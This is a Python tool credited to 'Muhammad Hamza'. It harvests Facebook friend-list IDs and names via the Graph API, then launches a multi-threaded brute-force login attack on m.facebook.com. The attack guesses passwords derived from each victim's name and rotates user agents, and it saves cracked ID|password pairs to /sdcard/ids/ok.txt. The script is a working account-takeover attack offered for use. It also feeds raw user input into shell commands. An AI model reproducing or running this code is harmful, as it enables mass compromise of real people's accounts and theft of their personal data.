#coding=utf-8
import os,sys,time,random,json,requests
from concurrent.futures import ThreadPoolExecutor as ThreadPool
logo="""
\t##     ##    #######    ########  
\t##     ##   ##     ##   ##     ## 
\t##     ##   ##     ##   ##     ## 
\t#########   ##     ##   ########
\t##     ##   ##     ##   ##        
\t##     ##   ##     ##   ##        
\t##     ##    #######    ##        
--------------------------------------------------
  Author   : Muhammad Hamza
  Github   : https://github.com/Hamzahash
  Youtube  : HCoders
--------------------------------------------------
  If oppurtunity donot knock, build a door
--------------------------------------------------"""
oks=[]
cps=[]
def main():
    os.system('clear')
    print(logo)
    print('  [1] Crack')
    print('  [2] Create file manual')
    print('  [3] Create file auto')
    print('  [4] Separate ids')
    print('  [l] Login another token')
    print(50*'-')
    option = input('  Select option: ')
    if option =='1':
        crack()
    elif option =='2':
        manual()
    elif option =='3':
        auto()
    elif option =='4':
        sep()
    elif option =='5':
        os.system('rm -rf .chrome.txt .android.txt && python hop.py')
    elif option =='l' or option =='L':
        print('  Logging you out first')
        time.sleep(1)
        os.system('rm -rf access_token.txt')
        login()
    else:
        print('  Choose valid option ')
        time.sleep(1)
        main()
def manual():
    try:
        token = open('access_token.txt', 'r').read()
    except FileNotFoundError:
        login()
    print('  Checking logged in account ....')
    try:
        r = requests.get('https://graph.facebook.com/me?access_token='+token).text
        q = json.loads(r)
        uname = q['name']
    except (KeyError):
        login()
    os.system('clear')
    print(logo)
    print('  Name: '+uname)
    print(50*'-')
    limit = int(input('  How many ids do you want to add ? '))
    save_file = input('  Save file as: ')
    t = 0
    for u in range(limit):
        t+=1
        try:
            ids = input('  Put id no%s : '%t)
            r = requests.get('https://graph.facebook.com/'+ids+'/friends?access_token='+token).text
            q = json.loads(r)
            for j in q['data']:
                uids = j['id']
                names = j['name']
                first_name = names.split(' ')[0]
                try:
                    last_name = names.split(' ')[1]
                except:
                    last_name = 'Khan'
                with open('/sdcard/'+save_file, 'a') as rd:
                    rd.write(uids+'|'+first_name+'|'+last_name+'\n')
        except KeyError:
            print('  No friend for '+ids)
            pass
    print(50*'-')
    print('  Ids saved as: '+save_file)
    print(50*'-')
    input(' Press enter to back')
    main()
def auto():
    os.system('rm -rf temp*')
    try:
        access_token = open('access_token.txt', 'r').read()
    except:
        login()
    try:
        r = requests.get('https://graph.facebook.com/me?access_token='+access_token).text
        q = json.loads(r)
        uname = q['name']
    except:
        login()
    os.system('clear')
    print(logo)
    print('  Logged user: '+uname)
    print(50*'-')
    nusrat = []
    try:
        limit_user = int(input('  How many ids do you want to add ? '))
    except:
        limit_user = 1
    count = 0
    for fir in range(limit_user):
        count +=1
        udit = input('  Put id%s: '%(count))
        try:
            fr = requests.get('https://graph.facebook.com/'+udit+'/friends?access_token='+access_token).text
            qfr = json.loads(fr)
            temp_save = open('temp.txt', 'a')
            for data in qfr['data']:
                uids = data['id']
                if uids in nusrat:
                    pass
                else:
                    nusrat.append(uids)
                    temp_save.write(uids+'\n')
            temp_save.close()
        except KeyError:
            if 'invalid' in str(fr):
                print('  Logged token has expired ...')
                pass
            else:
                print('  No friends found for user: '+udit)
                pass
    os.system('clear')
    print(logo)
    print('   Total ids: '+str(len(nusrat)))
    print(50*'-')
    try:
        ask_link = int(input('  How many links do you want to grab? '))
    except:
        ask_link = 1
    completed = 0
    for links in range(ask_link):
        completed +=1
        li = input('  %s Link start with: '%completed)
        os.system('cat temp.txt | grep "'+li+'" >> temp2.txt')
    save_file = input('  Save file as: ')
    os.system('clear')
    lines = open('temp2.txt', 'r').readlines()
    print(logo)
    print('  Total ids to grab: '+str(len(lines)))
    print('  Grabbing Process has started')
    print(50*'-')
    fileid = 'temp2.txt'
    fileidopen = open(fileid, 'r').read().splitlines()
    dill = []
    for ids in fileidopen:
        try:
            rg = requests.get('https://graph.facebook.com/'+ids+'/friends?access_token='+access_token).text
            rgq = json.loads(rg)
            idsave=open('/sdcard/'+save_file, 'a')
            for inayat in rgq['data']:
                uids = inayat['id']
                dill.append(uids)
                nm = inayat['name']
                first_name = nm.split(' ')[0]
                try:
                    last_name = nm.split(' ')[1]
                except:
                    last_name = 'Khan'
                idsave.write(uids+'<=>'+first_name+' '+last_name+'\n')
            print('  Grabbed from: '+ids)
           # print('  Total friends: '+str(len(uids)))
            print('  Token status: Live')
            print(50*'-')
            idsave.close()
            time.sleep(3)
        except Exception as e:
            #print(e)
            if 'invalid' in str(rg):
                print('  Token has expired, try again ...')
                os.system('rm -rf temp*')
                pass
            else:
                print('  Grabbed from: '+ids)
                print('  Friendlist ids: 0')
                print('  Token status: Live')
                print(50*'-')
                os.system('rm -rf temp*')
                pass
    lenid = open('/sdcard/'+save_file, 'r').readlines()
    print('  Grabbing Process has completed ')
    os.system('rm -rf temp*')
    print('  Total ids grabbed: '+str(len(lenid)))
    print('  File saved as: /sdcard/'+save_file)
    print(50*'-')
    input('  Press enter to back ')
    main()
def sep():
    os.system('clear')
    print(logo)
    try:
        limit = int(input(' How many links do you want to separate? '))
    except:
        limit = 1
    file_name = input(' Input file name: ')
    new_save = input(' Save new file as: ')
    y = 0
    for k in range(limit):
        y+=1
        links = input(' Put links %s: '%(y))
        os.system('cat '+file_name+' | grep "'+links+'" >> /sdcard/'+new_save)
    print(50*'-')
    print(' Links grabbed successfully')
    print('  Total grabbed links: '+str(len(open('/sdcard/'+new_save).read().splitlines())))
    print(' New file saved as: /sdcard/'+new_save)
    print(50*'-')
    input(' Press enter to back ')
    main()
def crack():
    os.system('clear')
    print(logo)
    uachoice = input('  Choose useragent(android/chrome) ? ')
    shivali = requests.get('https://raw.githubusercontent.com/Hamzahash/ua/main/'+uachoice+'.txt').text.splitlines()
    os.system('clear')
    print(logo)
    file = input('  Put file path: ')
    try:
        fileopen = open(file,'r').read().splitlines()
    except FileNotFoundError:
        print('  File not found on provided path, try again ....')
        time.sleep(1)
        crack()
    print(50*'-')
    print('  [1] All name passwords')
    print('  [2] First&last name passwords')
    print('  [3] Choice passwords')
    print(50*'-')
    gaddari = input('  Choose passlist: ')
    if gaddari =='1':
        with ThreadPool(max_workers=30) as yaari:
            os.system('clear')
            print(logo)
            print('  Total ids: '+str(len(fileopen)))
            print('  Brute Has been started')
            print(50*'-')
            for user in fileopen:
                uid,first,last = user.split('|')
                ps=first.lower()
                ps2=last.lower()
                pwx=[first+'123',first+'12345',ps+'12',ps+'1122',ps+'1234',ps+'786']
                yaari.submit(mbasic,uid,pwx,shivali)
        print(50*'-')
        print('  The process has completed')
        print('  Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
        print(50*'-')
        input('  Press enter to back ')
        main()
    elif gaddari =='2':
        with ThreadPool(max_workers=30) as yaari:
            os.system('clear')
            print(logo)
            print('  Total ids: '+str(len(fileopen)))
            print('  Brute Has been started')
            print(50*'-')
            for user in fileopen:
                uid,first,last=user.split('|')
                ps=first.lower()
                ps2=last.lower()
                pwx=[ps+' '+ps2,ps+ps2,first+' '+last]
                yaari.submit(mbasic,uid,pwx,shivali)
        print(50*'-')
        print('  The process has completed')
        print('  Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
        print(50*'-')
        input('  Press enter to back ')
        main()
    elif gaddari =='3':
        print(50*'-')
        print('  Password example: 667788,334455,99900,khan khan,khankhan etc')
        pwx = input('  Put passwords like example: ').split(',')
        with ThreadPool(max_workers=30) as yaari:
            os.system('clear')
            print(logo)
            print('  Total ids: '+str(len(fileopen)))
            print('  Brute Has been started')
            print(50*'-')
            for user in fileopen:
                uid,first,last=user.split('|')
                yaari.submit(mbasic,uid,pwx,shivali)
        print(50*'-')
        print('  The process has completed')
        print('  Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
        print(50*'-')
        input('  Press enter to back ')
        main()
    else:
        print('  Choose valid passlist, try again ...')
        time.sleep(1)
        crack()
def mbasic(uid,pwx,shivali):
    try:os.mkdir('/sdcard/ids')
    except:pass
    try:
        global oks
        global cps
        ua=random.choice(shivali)
        for ps in pwx:
            session = requests.Session()
            log_data = {"try_number":"0","unrecognized_tries":"0","email": uid,"pass": ps,"_fb_noscript": "true"}
            header = {'User-Agent':ua}
            session.headers.update(header)
            log_s = session.post('https://m.facebook.com/login.php', data = log_data)
            get_cookie = session.cookies.get_dict().keys()
            if 'c_user' in get_cookie:
                print('\033[1;32m  [Successful-WAHID] '+uid+' | '+ps+'\033[0;97m')
                oks.append(uid)
                with open('/sdcard/ids/ok.txt','a') as pushpa:
                    pushpa.write(uid+'|'+ps+'\n')
                break
            elif 'checkpoint' in get_cookie:
                print('\033[1;31m  [Checkpoint-WAHID] '+uid+' | '+ps+'\033[0;97m')
                cps.appene(uid)
                break
            else:
                continue
    except:pass
def login():
    os.system('clear')
    print(logo)
    tok = input('  Put access token: ')
    try:
        u = requests.get('https://graph.facebook.com/me?access_token='+tok).text
        u1 = json.loads(u)
        name = u1['name']
        ts = open('access_token.txt', 'w')
        ts.write(tok)
        ts.close()
        print(' Logged in successfully')
        time.sleep(1)
        main()
    except KeyError:
        print('\n  Invalid token provided, try again  ')
        time.sleep(1)
        login()
if __name__=='__main__':
    main()
